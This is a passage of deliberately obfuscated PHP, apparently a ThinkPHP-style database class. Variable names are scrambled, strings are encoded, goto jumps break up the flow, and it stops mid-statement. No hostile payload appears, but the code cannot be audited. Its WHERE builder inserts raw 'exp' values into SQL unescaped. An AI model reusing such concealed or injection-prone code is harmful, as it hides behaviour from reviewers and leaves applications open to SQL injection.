$aè©Ó•Í©¦; } public function execute($e˜±¢‡˜¼”) { $Càé¶…ÀÓ´ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!CacheLock::fileLock($Càé¶…ÀÓ´[9])) { return !1; } $d†˜ÚŠœë = parent::execute($e˜±¢‡˜¼”); CacheLock::fileUnLock($Càé¶…ÀÓ´[9]); return $d†˜ÚŠœë; } } class DbSqlite3 extends DbSqlite3Base { public function query($FÅ‹±®òôÜ) { $f’Ğ¹Õ£ŞÜ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!CacheLock::fileLock($f’Ğ¹Õ£ŞÜ[9])) { return !1; } $AÅ‘½Ş¥³ = parent::query($FÅ‹±®òôÜ); CacheLock::fileUnLock($f’Ğ¹Õ£ŞÜ[9]); return $AÅ‘½Ş¥³; } public function execute($c‘ğ‡ê¯¹‚) { $b¬Œ¡—²¼º =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!CacheLock::fileLock($b¬Œ¡—²¼º[9])) { return !1; } $eÕèœ¡¼… = parent::execute($c‘ğ‡ê¯¹‚); CacheLock::fileUnLock($b¬Œ¡—²¼º[9]); return $eÕèœ¡¼…; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\x68\x69\156\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\161" => "\75", "\x6e\x65\x71" => "\74\76", "\x67\164" => "\x3e", "\145\147\164" => "\x3e\75", "\154\164" => "\74", "\145\x6c\164" => "\74\75", "\x6e\x6f\164\154\151\153\145" => "\x4e\x4f\x54\40\x4c\111\113\105", "\154\151\153\145" => "\x4c\111\113\x45", "\x69\156" => "\111\x4e", "\x6e\x6f\x74\151\x6e" => "\x4e\x4f\124\40\x49\116", "\x6e\157\164\x20\x69\x6e" => "\116\x4f\124\40\x49\116", "\142\145\x74\167\x65\145\x6e" => "\102\105\124\127\105\105\x4e", "\x6e\x6f\164\142\145\x74\x77\145\145\156" => "\x4e\x4f\x54\40\102\105\x54\x57\105\x45\x4e", "\156\x6f\x74\40\142\x65\x74\x77\x65\x65\x6e" => "\x4e\117\124\40\102\105\x54\x57\x45\x45\x4e"); protected $selectSql = "\x53\105\x4c\x45\103\124\45\104\111\x53\x54\x49\x4e\103\124\45\x20\x25\106\x49\x45\x4c\104\45\x20\x46\x52\x4f\115\x20\45\124\x41\x42\x4c\105\45\45\112\x4f\x49\116\45\45\127\x48\105\x52\105\x25\45\107\122\x4f\x55\x50\x25\x25\110\x41\x56\111\116\x47\x25\x25\x4f\x52\104\x45\x52\45\45\x4c\111\115\111\124\x25\x20\45\125\116\111\117\116\45\45\x43\117\115\x4d\105\x4e\124\45"; protected $bind = array(); public static function getInstance() { $F×ÂƒÇËÙ¦ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[í¤âËÚ£¶íÊ¢][880], $F×ÂƒÇËÙ¦); } public function factory($Bğ¯ê¼Ã½ = '') { goto dÚ´ÉÄ¶Ş; dÚ´ÉÄ¶Ş: $dï·êĞğ†å =& $_SERVER[í¤âËÚ£¶íÊ¢]; $Bğ¯ê¼Ã½ = $this->parseConfig($Bğ¯ê¼Ã½); if (empty($Bğ¯ê¼Ã½[$dï·êĞğ†å[881]])) { think_exception(think_lang($dï·êĞğ†å[882])); } goto AïÃ§˜ù†Ú; AïÃ§˜ù†Ú: $this->dbType = ucwords(strtolower($Bğ¯ê¼Ã½[$dï·êĞğ†å[881]])); $eî…ğÕÓ = $dï·êĞğ†å[883] . $this->dbType; if (class_exists($eî…ğÕÓ)) { $dƒá–Ô‘ŸÅ = new $eî…ğÕÓ($Bğ¯ê¼Ã½); if ($dï·êĞğ†å[730] != strtolower($Bğ¯ê¼Ã½[$dï·êĞğ†å[881]])) { $dƒá–Ô‘ŸÅ->dbType = strtoupper($this->dbType); } else { $dƒá–Ô‘ŸÅ->dbType = $this->_getDsnType($Bğ¯ê¼Ã½[$dï·êĞğ†å[836]]); } } else { think_exception(think_lang($dï·êĞğ†å[884]) . $dï·êĞğ†å[885] . $eî…ğÕÓ); } goto EÙÜ÷Æôâ‘; EÙÜ÷Æôâ‘: return $dƒá–Ô‘ŸÅ; goto C“Ö¼¨ÌÊÓ; C“Ö¼¨ÌÊÓ: } public function __call($a³Íî×°, $d›õ¸Ö«˜é) { if (method_exists($this, $a³Íî×°)) { return call_user_func_array(array($this, $a³Íî×°), $d›õ¸Ö«˜é); } } protected function _getDsnType($aŞÅÆë•Ë) { $f ‚¾’½õö = explode($_SERVER[í¤âËÚ£¶íÊ¢][4], $aŞÅÆë•Ë); $eòË¼ãá¼¤ = strtoupper(trim($f ‚¾’½õö[0])); return $eòË¼ãá¼¤; } private function parseConfig($F±¼Ë‰¡ĞŸ = '') { $D“”ãŒŠ¯„ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!empty($F±¼Ë‰¡ĞŸ) && is_string($F±¼Ë‰¡ĞŸ)) { $F±¼Ë‰¡ĞŸ = $this->parseDSN($F±¼Ë‰¡ĞŸ); } elseif (is_array($F±¼Ë‰¡ĞŸ)) { $F±¼Ë‰¡ĞŸ = array_change_key_case($F±¼Ë‰¡ĞŸ); $F±¼Ë‰¡ĞŸ = array($D“”ãŒŠ¯„[881] => $F±¼Ë‰¡ĞŸ[$D“”ãŒŠ¯„[729]], $D“”ãŒŠ¯„[809] => $F±¼Ë‰¡ĞŸ[$D“”ãŒŠ¯„[886]], $D“”ãŒŠ¯„[810] => $F±¼Ë‰¡ĞŸ[$D“”ãŒŠ¯„[887]], $D“”ãŒŠ¯„[807] => $F±¼Ë‰¡ĞŸ[$D“”ãŒŠ¯„[888]], $D“”ãŒŠ¯„[808] => $F±¼Ë‰¡ĞŸ[$D“”ãŒŠ¯„[889]], $D“”ãŒŠ¯„[17] => $F±¼Ë‰¡ĞŸ[$D“”ãŒŠ¯„[890]], $D“”ãŒŠ¯„[836] => $F±¼Ë‰¡ĞŸ[$D“”ãŒŠ¯„[731]], $D“”ãŒŠ¯„[13] => isset($F±¼Ë‰¡ĞŸ[$D“”ãŒŠ¯„[891]]) ? $F±¼Ë‰¡ĞŸ[$D“”ãŒŠ¯„[891]] : array()); } elseif (empty($F±¼Ë‰¡ĞŸ)) { if (think_config($D“”ãŒŠ¯„[892]) && $D“”ãŒŠ¯„[730] != strtolower(think_config($D“”ãŒŠ¯„[893]))) { $F±¼Ë‰¡ĞŸ = $this->parseDSN(think_config($D“”ãŒŠ¯„[892])); } else { $F±¼Ë‰¡ĞŸ = array($D“”ãŒŠ¯„[881] => think_config($D“”ãŒŠ¯„[893]), $D“”ãŒŠ¯„[809] => think_config($D“”ãŒŠ¯„[894]), $D“”ãŒŠ¯„[810] => think_config($D“”ãŒŠ¯„[895]), $D“”ãŒŠ¯„[807] => think_config($D“”ãŒŠ¯„[896]), $D“”ãŒŠ¯„[808] => think_config($D“”ãŒŠ¯„[897]), $D“”ãŒŠ¯„[17] => think_config($D“”ãŒŠ¯„[251]), $D“”ãŒŠ¯„[836] => think_config($D“”ãŒŠ¯„[892]), $D“”ãŒŠ¯„[13] => think_config($D“”ãŒŠ¯„[898])); } } return $F±¼Ë‰¡ĞŸ; } protected function initConnect($c…ÙÔ®ŞõÍ = true) { if (1 == think_config($_SERVER[í¤âËÚ£¶íÊ¢][18])) { $this->_linkID = $this->multiConnect($c…ÙÔ®ŞõÍ); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $a¾™‰‚† => $A‰‡‹™éì„) { $this->_linkID = $A‰‡‹™éì„; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($dÃ…±åÄëˆ = false) { $aÂÄ…‘ÒÌ­ =& $_SERVER[í¤âËÚ£¶íÊ¢]; static $aÃ§…ôÈÕÍ = array(); if (empty($aÃ§…ôÈÕÍ)) { foreach ($this->config as $Bìà™±ğéõ => $fµ«´…×ÉÌ) { $aÃ§…ôÈÕÍ[$Bìà™±ğéõ] = explode($aÂÄ…‘ÒÌ­[47], $fµ«´…×ÉÌ); } } if (think_config($aÂÄ…‘ÒÌ­[899])) { if ($dÃ…±åÄëˆ) { $eóª„Š¡†Ó = floor(mt_rand(0, think_config($aÂÄ…‘ÒÌ­[900]) - 1)); } else { if (is_numeric(think_config($aÂÄ…‘ÒÌ­[901]))) { $eóª„Š¡†Ó = think_config($aÂÄ…‘ÒÌ­[901]); } else { $eóª„Š¡†Ó = floor(mt_rand(think_config($aÂÄ…‘ÒÌ­[900]), count($aÃ§…ôÈÕÍ[$aÂÄ…‘ÒÌ­[807]]) - 1)); } } } else { $eóª„Š¡†Ó = floor(mt_rand(0, count($aÃ§…ôÈÕÍ[$aÂÄ…‘ÒÌ­[807]]) - 1)); } $b½‰¯’È®‚ = array($aÂÄ…‘ÒÌ­[809] => isset($aÃ§…ôÈÕÍ[$aÂÄ…‘ÒÌ­[809]][$eóª„Š¡†Ó]) ? $aÃ§…ôÈÕÍ[$aÂÄ…‘ÒÌ­[809]][$eóª„Š¡†Ó] : $aÃ§…ôÈÕÍ[$aÂÄ…‘ÒÌ­[809]][0], $aÂÄ…‘ÒÌ­[810] => isset($aÃ§…ôÈÕÍ[$aÂÄ…‘ÒÌ­[810]][$eóª„Š¡†Ó]) ? $aÃ§…ôÈÕÍ[$aÂÄ…‘ÒÌ­[810]][$eóª„Š¡†Ó] : $aÃ§…ôÈÕÍ[$aÂÄ…‘ÒÌ­[810]][0], $aÂÄ…‘ÒÌ­[807] => isset($aÃ§…ôÈÕÍ[$aÂÄ…‘ÒÌ­[807]][$eóª„Š¡†Ó]) ? $aÃ§…ôÈÕÍ[$aÂÄ…‘ÒÌ­[807]][$eóª„Š¡†Ó] : $aÃ§…ôÈÕÍ[$aÂÄ…‘ÒÌ­[807]][0], $aÂÄ…‘ÒÌ­[808] => isset($aÃ§…ôÈÕÍ[$aÂÄ…‘ÒÌ­[808]][$eóª„Š¡†Ó]) ? $aÃ§…ôÈÕÍ[$aÂÄ…‘ÒÌ­[808]][$eóª„Š¡†Ó] : $aÃ§…ôÈÕÍ[$aÂÄ…‘ÒÌ­[808]][0], $aÂÄ…‘ÒÌ­[17] => isset($aÃ§…ôÈÕÍ[$aÂÄ…‘ÒÌ­[17]][$eóª„Š¡†Ó]) ? $aÃ§…ôÈÕÍ[$aÂÄ…‘ÒÌ­[17]][$eóª„Š¡†Ó] : $aÃ§…ôÈÕÍ[$aÂÄ…‘ÒÌ­[17]][0], $aÂÄ…‘ÒÌ­[836] => isset($aÃ§…ôÈÕÍ[$aÂÄ…‘ÒÌ­[836]][$eóª„Š¡†Ó]) ? $aÃ§…ôÈÕÍ[$aÂÄ…‘ÒÌ­[836]][$eóª„Š¡†Ó] : $aÃ§…ôÈÕÍ[$aÂÄ…‘ÒÌ­[836]][0], $aÂÄ…‘ÒÌ­[13] => isset($aÃ§…ôÈÕÍ[$aÂÄ…‘ÒÌ­[13]][$eóª„Š¡†Ó]) ? $aÃ§…ôÈÕÍ[$aÂÄ…‘ÒÌ­[13]][$eóª„Š¡†Ó] : $aÃ§…ôÈÕÍ[$aÂÄ…‘ÒÌ­[13]][0]); return $this->connect($b½‰¯’È®‚, $eóª„Š¡†Ó); } public function parseDSN($bÅ¬®­ìŠ‰) { $d‘šÒ¾­Œ³ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (empty($bÅ¬®­ìŠ‰)) { return !1; } $d ¾ƒˆ³µ = parse_url($bÅ¬®­ìŠ‰); if ($d ¾ƒˆ³µ[$d‘šÒ¾­Œ³[183]]) { $A›œÎÑìÖ§ = array($d‘šÒ¾­Œ³[881] => $d ¾ƒˆ³µ[$d‘šÒ¾­Œ³[183]], $d‘šÒ¾­Œ³[809] => isset($d ¾ƒˆ³µ[$d‘šÒ¾­Œ³[566]]) ? $d ¾ƒˆ³µ[$d‘šÒ¾­Œ³[566]] : $d‘šÒ¾­Œ³[33], $d‘šÒ¾­Œ³[810] => isset($d ¾ƒˆ³µ[$d‘šÒ¾­Œ³[902]]) ? $d ¾ƒˆ³µ[$d‘šÒ¾­Œ³[902]] : $d‘šÒ¾­Œ³[33], $d‘šÒ¾­Œ³[807] => isset($d ¾ƒˆ³µ[$d‘šÒ¾­Œ³[184]]) ? $d ¾ƒˆ³µ[$d‘šÒ¾­Œ³[184]] : $d‘šÒ¾­Œ³[33], $d‘šÒ¾­Œ³[808] => isset($d ¾ƒˆ³µ[$d‘šÒ¾­Œ³[185]]) ? $d ¾ƒˆ³µ[$d‘šÒ¾­Œ³[185]] : $d‘šÒ¾­Œ³[33], $d‘šÒ¾­Œ³[17] => isset($d ¾ƒˆ³µ[$d‘šÒ¾­Œ³[85]]) ? substr($d ¾ƒˆ³µ[$d‘šÒ¾­Œ³[85]], 1) : $d‘šÒ¾­Œ³[33]); } else { preg_match($d‘šÒ¾­Œ³[903], trim($bÅ¬®­ìŠ‰), $cÂ…í¿©º); $A›œÎÑìÖ§ = array($d‘šÒ¾­Œ³[881] => $cÂ…í¿©º[1], $d‘šÒ¾­Œ³[809] => $cÂ…í¿©º[2], $d‘šÒ¾­Œ³[810] => $cÂ…í¿©º[3], $d‘šÒ¾­Œ³[807] => $cÂ…í¿©º[4], $d‘šÒ¾­Œ³[808] => $cÂ…í¿©º[5], $d‘šÒ¾­Œ³[17] => $cÂ…í¿©º[6]); } $A›œÎÑìÖ§[$d‘šÒ¾­Œ³[836]] = $d‘šÒ¾­Œ³[33]; return $A›œÎÑìÖ§; } protected function debug() { $b†×†ùö½ğ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $b†×†ùö½ğ[904]; if (think_config($b†×†ùö½ğ[905])) { think_status($b†×†ùö½ğ[906]); think_trace($this->queryStr . $b†×†ùö½ğ[907] . think_status($b†×†ùö½ğ[20], $b†×†ùö½ğ[906], 6) . $b†×†ùö½ğ[908], $b†×†ùö½ğ[33], $b†×†ùö½ğ[909]); } } protected function parseLock($DÁªÒÒ¿ = false) { $Cê’ÖÛÚŸ¿ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$DÁªÒÒ¿) { return $Cê’ÖÛÚŸ¿[33]; } if ($Cê’ÖÛÚŸ¿[838] == $this->dbType) { return $Cê’ÖÛÚŸ¿[910]; } return $Cê’ÖÛÚŸ¿[911]; } protected function parseSet($a¢„‹ ÉÜÂ) { $eÎâÄ±ºÔÑ =& $_SERVER[í¤âËÚ£¶íÊ¢]; foreach ($a¢„‹ ÉÜÂ as $B•ÔºË => $f“èñóù³) { if (is_array($f“èñóù³) && $eÎâÄ±ºÔÑ[302] == $f“èñóù³[0]) { $a¾¾…óŞ[] = $this->parseKey($B•ÔºË) . $eÎâÄ±ºÔÑ[912] . $f“èñóù³[1]; } elseif (is_scalar($f“èñóù³) || is_null($f“èñóù³)) { $a¾¾…óŞ[] = $this->parseKey($B•ÔºË) . $eÎâÄ±ºÔÑ[912] . $this->parseValue($f“èñóù³); } } return $eÎâÄ±ºÔÑ[913] . implode($eÎâÄ±ºÔÑ[47], $a¾¾…óŞ); } protected function bindParam($f¢¡ê‘¹Ì, $c’ó¾™“’Ù) { $this->bind[$_SERVER[í¤âËÚ£¶íÊ¢][4] . $f¢¡ê‘¹Ì] = $c’ó¾™“’Ù; } protected function parseBind($dšµ•òßˆö) { $dšµ•òßˆö = array_merge($this->bind, $dšµ•òßˆö); $this->bind = array(); return $dšµ•òßˆö; } function parseKey(&$cÊ‚ĞáºÊé, $f‹‰¶ùˆ¾† = true) { if ($f‹‰¶ùˆ¾†) { $cÊ‚ĞáºÊé = $this->parseKeyCheck($cÊ‚ĞáºÊé); } return $cÊ‚ĞáºÊé; } function parseKeyCheck($bÈËô¸‡§Ò) { $c”ï‡«‚ÔÖ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $bÈËô¸‡§Ò = trim($bÈËô¸‡§Ò); if (!preg_match($c”ï‡«‚ÔÖ[914], $bÈËô¸‡§Ò)) { think_exception($c”ï‡«‚ÔÖ[915] . $bÈËô¸‡§Ò); } return $bÈËô¸‡§Ò; } protected function parseValue($fÅ—›ƒÛæŸ) { $c‚·Ğå”è =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (is_string($fÅ—›ƒÛæŸ)) { $fÅ—›ƒÛæŸ = $c‚·Ğå”è[877] . $this->escapeString($fÅ—›ƒÛæŸ) . $c‚·Ğå”è[877]; } elseif (isset($fÅ—›ƒÛæŸ[0]) && is_string($fÅ—›ƒÛæŸ[0]) && strtolower($fÅ—›ƒÛæŸ[0]) == $c‚·Ğå”è[302]) { $fÅ—›ƒÛæŸ = $this->escapeString($fÅ—›ƒÛæŸ[1]); } elseif (is_array($fÅ—›ƒÛæŸ)) { $fÅ—›ƒÛæŸ = array_map(array($this, $c‚·Ğå”è[878]), $fÅ—›ƒÛæŸ); } elseif (is_bool($fÅ—›ƒÛæŸ)) { $fÅ—›ƒÛæŸ = $fÅ—›ƒÛæŸ ? $c‚·Ğå”è[96] : $c‚·Ğå”è[500]; } elseif (is_null($fÅ—›ƒÛæŸ)) { $fÅ—›ƒÛæŸ = $c‚·Ğå”è[112]; } return $fÅ—›ƒÛæŸ; } protected function parseField($D–·öøªÃÃ) { $FÂª©¹„¿ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (is_string($D–·öøªÃÃ) && strpos($D–·öøªÃÃ, $FÂª©¹„¿[47])) { $D–·öøªÃÃ = explode($FÂª©¹„¿[47], $D–·öøªÃÃ); } if (is_array($D–·öøªÃÃ)) { $C¦ğÄãší® = array(); foreach ($D–·öøªÃÃ as $CôƒİŞáì‡ => $a»Ñ‰Úö’’) { if (!is_numeric($CôƒİŞáì‡)) { $C¦ğÄãší®[] = $this->parseKey($CôƒİŞáì‡, !1) . $FÂª©¹„¿[916] . $this->parseKey($a»Ñ‰Úö’’); } else { $C¦ğÄãší®[] = $this->parseKey($a»Ñ‰Úö’’); } } $eäªÉ¢Š³Û = implode($FÂª©¹„¿[47], $C¦ğÄãší®); } elseif (is_string($D–·öøªÃÃ) && !empty($D–·öøªÃÃ)) { $eäªÉ¢Š³Û = $D–·öøªÃÃ; } else { $eäªÉ¢Š³Û = $FÂª©¹„¿[191]; } return $eäªÉ¢Š³Û; } protected function parseTable($dá°•Â¸Ù¥) { $cÒíÂ†²™‘ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (is_array($dá°•Â¸Ù¥)) { $b§›¥¤’İà = array(); foreach ($dá°•Â¸Ù¥ as $BÊ¼ë‚…À => $d•èéÔ»”¹) { if (!is_numeric($BÊ¼ë‚…À)) { $b§›¥¤’İà[] = $this->parseKey($BÊ¼ë‚…À) . $cÒíÂ†²™‘[50] . $this->parseKey($d•èéÔ»”¹); } else { $b§›¥¤’İà[] = $this->parseKey($BÊ¼ë‚…À); } } $dá°•Â¸Ù¥ = $b§›¥¤’İà; } elseif (is_string($dá°•Â¸Ù¥)) { if (strstr($dá°•Â¸Ù¥, $cÒíÂ†²™‘[50])) { return $dá°•Â¸Ù¥; } $dá°•Â¸Ù¥ = explode($cÒíÂ†²™‘[47], $dá°•Â¸Ù¥); array_walk($dá°•Â¸Ù¥, array($this, $cÒíÂ†²™‘[827])); } return $cÒíÂ†²™‘[821] . trim(implode($cÒíÂ†²™‘[917], $dá°•Â¸Ù¥), $cÒíÂ†²™‘[389]) . $cÒíÂ†²™‘[821]; } protected function parseWhere($C—Í±Î¿ˆ) { $eÄ÷Æ¯ˆÙ… =& $_SERVER[í¤âËÚ£¶íÊ¢]; $d…¶ö……Ì’ = $eÄ÷Æ¯ˆÙ…[33]; if (is_string($C—Í±Î¿ˆ)) { $d…¶ö……Ì’ = $C—Í±Î¿ˆ; } else { $D—Œø•œª = isset($C—Í±Î¿ˆ[$eÄ÷Æ¯ˆÙ…[918]]) ? strtoupper($C—Í±Î¿ˆ[$eÄ÷Æ¯ˆÙ…[918]]) : $eÄ÷Æ¯ˆÙ…[33]; if (in_array($D—Œø•œª, array($eÄ÷Æ¯ˆÙ…[919], $eÄ÷Æ¯ˆÙ…[920], $eÄ÷Æ¯ˆÙ…[921]))) { $D—Œø•œª = $eÄ÷Æ¯ˆÙ…[50] . $D—Œø•œª . $eÄ÷Æ¯ˆÙ…[50]; unset($C—Í±Î¿ˆ[$eÄ÷Æ¯ˆÙ…[918]]); } else { $D—Œø•œª = $eÄ÷Æ¯ˆÙ…[922]; } foreach ($C—Í±Î¿ˆ as $E‡˜ƒäâÛ¨ => $e¨‹¸£¬®) { $d…¶ö……Ì’ .= $eÄ÷Æ¯ˆÙ…[282]; if (is_numeric($E‡˜ƒäâÛ¨)) { $E‡˜ƒäâÛ¨ = $eÄ÷Æ¯ˆÙ…[923]; } if (0 === strpos($E‡˜ƒäâÛ¨, $eÄ÷Æ¯ˆÙ…[80])) { $d…¶ö……Ì’ .= $this->parseThinkWhere($E‡˜ƒäâÛ¨, $e¨‹¸£¬®); } else { if (!preg_match($eÄ÷Æ¯ˆÙ…[924], trim($E‡˜ƒäâÛ¨))) { think_exception(think_lang($eÄ÷Æ¯ˆÙ…[925]) . $eÄ÷Æ¯ˆÙ…[4] . $E‡˜ƒäâÛ¨); } $bèÑßÆ´šã = is_array($e¨‹¸£¬®) && isset($e¨‹¸£¬®[$eÄ÷Æ¯ˆÙ…[926]]); $E‡˜ƒäâÛ¨ = trim($E‡˜ƒäâÛ¨); if (strpos($E‡˜ƒäâÛ¨, $eÄ÷Æ¯ˆÙ…[288])) { $BÓòÎåìÙì = explode($eÄ÷Æ¯ˆÙ…[288], $E‡˜ƒäâÛ¨); $eéô¯İÈ‚ê = array(); foreach ($BÓòÎåìÙì as $c¼ìæÎÜ©‘ => $EÚåĞµªÁ°) { $a¥½µáèŒ = $bèÑßÆ´šã ? $e¨‹¸£¬®[$c¼ìæÎÜ©‘] : $e¨‹¸£¬®; $eéô¯İÈ‚ê[] = $eÄ÷Æ¯ˆÙ…[265] . $this->parseWhereItem($this->parseKey($EÚåĞµªÁ°), $a¥½µáèŒ) . $eÄ÷Æ¯ˆÙ…[826]; } $d…¶ö……Ì’ .= implode($eÄ÷Æ¯ˆÙ…[927], $eéô¯İÈ‚ê); } elseif (strpos($E‡˜ƒäâÛ¨, $eÄ÷Æ¯ˆÙ…[289])) { $BÓòÎåìÙì = explode($eÄ÷Æ¯ˆÙ…[289], $E‡˜ƒäâÛ¨); $eéô¯İÈ‚ê = array(); foreach ($BÓòÎåìÙì as $c¼ìæÎÜ©‘ => $EÚåĞµªÁ°) { $a¥½µáèŒ = $bèÑßÆ´šã ? $e¨‹¸£¬®[$c¼ìæÎÜ©‘] : $e¨‹¸£¬®; $eéô¯İÈ‚ê[] = $eÄ÷Æ¯ˆÙ…[265] . $this->parseWhereItem($this->parseKey($EÚåĞµªÁ°), $a¥½µáèŒ) . $eÄ÷Æ¯ˆÙ…[826]; } $d…¶ö……Ì’ .= implode($eÄ÷Æ¯ˆÙ…[922], $eéô¯İÈ‚ê); } else { $d…¶ö……Ì’ .= $this->parseWhereItem($this->parseKey($E‡˜ƒäâÛ¨), $e¨‹¸£¬®); } } $d…¶ö……Ì’ .= $eÄ÷Æ¯ˆÙ…[283] . $D—Œø•œª; } $d…¶ö……Ì’ = substr($d…¶ö……Ì’, 0, -strlen($D—Œø•œª)); } return empty($d…¶ö……Ì’) ? $eÄ÷Æ¯ˆÙ…[33] : $eÄ÷Æ¯ˆÙ…[928] . $d…¶ö……Ì’; } protected function parseWhereItem($F½è“…ß², $DÛÇö×ÀÕ—) { $Eè¸´•Â–† =& $_SERVER[í¤âËÚ£¶íÊ¢]; $DƒÓ„øÚÚã = $Eè¸´•Â–†[33]; if (is_array($DÛÇö×ÀÕ—)) { if (is_string($DÛÇö×ÀÕ—[0])) { $CÍ®èÔà‹ = strtolower($DÛÇö×ÀÕ—[0]); if (in_array($DÛÇö×ÀÕ—[0], array($Eè¸´•Â–†[912], $Eè¸´•Â–†[929], $Eè¸´•Â–†[930], $Eè¸´•Â–†[931], $Eè¸´•Â–†[932], $Eè¸´•Â–†[933]))) { $DƒÓ„øÚÚã .= $F½è“…ß² . $Eè¸´•Â–†[50] . $DÛÇö×ÀÕ—[0] . $Eè¸´•Â–†[50] . $this->parseValue($DÛÇö×ÀÕ—[1]); } elseif (preg_match($Eè¸´•Â–†[934], $DÛÇö×ÀÕ—[0])) { $DƒÓ„øÚÚã .= $F½è“…ß² . $Eè¸´•Â–†[50] . $this->exp[$CÍ®èÔà‹] . $Eè¸´•Â–†[50] . $this->parseValue($DÛÇö×ÀÕ—[1]); } elseif (preg_match($Eè¸´•Â–†[935], $DÛÇö×ÀÕ—[0])) { if (is_array($DÛÇö×ÀÕ—[1])) { $D¯ø¼ù¢Ú = isset($DÛÇö×ÀÕ—[2]) ? strtoupper($DÛÇö×ÀÕ—[2]) : $Eè¸´•Â–†[920]; if (in_array($D¯ø¼ù¢Ú, array($Eè¸´•Â–†[919], $Eè¸´•Â–†[920], $Eè¸´•Â–†[921]))) { $B‡šƒ•‡ = array(); foreach ($DÛÇö×ÀÕ—[1] as $E±®ÀŠÀ) { $B‡šƒ•‡[] = $F½è“…ß² . $Eè¸´•Â–†[50] . $this->exp[$CÍ®èÔà‹] . $Eè¸´•Â–†[50] . $this->parseValue($E±®ÀŠÀ); } $DƒÓ„øÚÚã .= $Eè¸´•Â–†[265] . implode($Eè¸´•Â–†[50] . $D¯ø¼ù¢Ú . $Eè¸´•Â–†[50], $B‡šƒ•‡) . $Eè¸´•Â–†[826]; } } else { $DƒÓ„øÚÚã .= $F½è“…ß² . $Eè¸´•Â–†[50] . $this->exp[$CÍ®èÔà‹] . $Eè¸´•Â–†[50] . $this->parseValue($DÛÇö×ÀÕ—[1]); } } elseif ($Eè¸´•Â–†[302] == $CÍ®èÔà‹) { $DƒÓ„øÚÚã .= $Eè¸´•Â–†[824] . $F½è“…ß² . $Eè¸´•Â–†[50] . $DÛÇö×ÀÕ—[1] . $Eè¸´•Â–†[936]; } elseif (preg_match($Eè¸´•Â–†[937], $DÛÇö×ÀÕ—[0])) { $DƒÓ„øÚÚã .= $DÛÇö×ÀÕ—[0]; } elseif (preg_match($Eè¸´•Â–†[938], $DÛÇö×ÀÕ—[0])) { if (isset($DÛÇö×ÀÕ—[2]) && $Eè¸´•Â–†[302] == $DÛÇö×ÀÕ—[2]) { $DƒÓ„øÚÚã .= $F½è“…ß² . $Eè¸´•Â–†[50] . $this->exp[$CÍ®èÔà‹] . $Eè¸´•Â–†[50] . $DÛÇö×ÀÕ—[1]; } else { if (is_string($DÛÇö×ÀÕ—[1])) { $DÛÇö×ÀÕ—[1] = explode($Eè¸´•Â–†[47], $DÛÇö×ÀÕ—[1]); } $BÀ‰Ğ’©™ç = implode($Eè¸´•Â–†[47], $this->parseValue($DÛÇö×ÀÕ—[1])); $DƒÓ„øÚÚã .= $F½è“…ß² . $Eè¸´•Â–†[50] . $this->exp[$CÍ®èÔà‹] . $Eè¸´•Â–†[824] . $BÀ‰Ğ’©™ç . $Eè¸´•Â–†[826]; } } elseif (preg_match($Eè¸´•Â–†[939], $DÛÇö×ÀÕ—[0])) { $d«é½Ì¨ñõ = is_string($DÛÇö×ÀÕ—[1]) ? explode($Eè¸´•Â–†[47], $DÛÇö×ÀÕ—[1]) : $DÛÇö×ÀÕ—[1]; $DƒÓ„øÚÚã .= $Eè¸´•Â–†[824] . $F½è“…ß² . $Eè¸´•Â–†[50] . $this->exp[$CÍ®èÔà‹] . $Eè¸´•Â–†[50] . $this->parseValue($d«é½Ì¨ñõ[0]) . $Eè¸´•Â–†[922] . $this->parseValue($d«é½Ì¨ñõ[1]) . $Eè¸´•Â–†[283]; } else { think_exception(think_lang($Eè¸´•Â–†[925]) . $Eè¸´•Â–†[4] . $DÛÇö×ÀÕ—[0]); } } else { $dË®¤¯½° = count($DÛÇö×ÀÕ—); $Eæ¨áĞÕ = $Eè¸´•Â–†[33]; if (is_string($DÛÇö×ÀÕ—[$dË®¤¯½° - 1])) { $Eæ¨áĞÕ = isset($DÛÇö×ÀÕ—[$dË®¤¯½° - 1]) ? strtoupper($DÛÇö×ÀÕ—[$dË®¤¯½° - 1]) : $Eè¸´•Â–†[33]; if (in_array($Eæ¨áĞÕ, array($Eè¸´•Â–†[919], $Eè¸´•Â–†[920], $Eè¸´•Â–†[921]))) { $dË®¤¯½° = $dË®¤¯½° - 1; } } else { $Eæ¨áĞÕ = $Eè¸´•Â–†[919]; } for ($e±¯ÚÏ¡Õ± = 0; $e±¯ÚÏ¡Õ± < $dË®¤¯½°; $e±¯ÚÏ¡Õ±++) { $d«é½Ì¨ñõ = is_array($DÛÇö×ÀÕ—[$e±¯ÚÏ¡Õ±]) ? $DÛÇö×ÀÕ—[$e±¯ÚÏ¡Õ±][1] : $DÛÇö×ÀÕ—[$e±¯ÚÏ¡Õ±]; if ($Eè¸´•Â–†[302] == strtolower($DÛÇö×ÀÕ—[$e±¯ÚÏ¡Õ±][0])) { $DƒÓ„øÚÚã .= $Eè¸´•Â–†[265] . $F½è“…ß² . $Eè¸´•Â–†[50] . $d«é½Ì¨ñõ . $Eè¸´•Â–†[936] . $Eæ¨áĞÕ . $Eè¸´•Â–†[50]; } else { $d”®å„»„© = is_array($DÛÇö×ÀÕ—[$e±¯ÚÏ¡Õ±]) ? 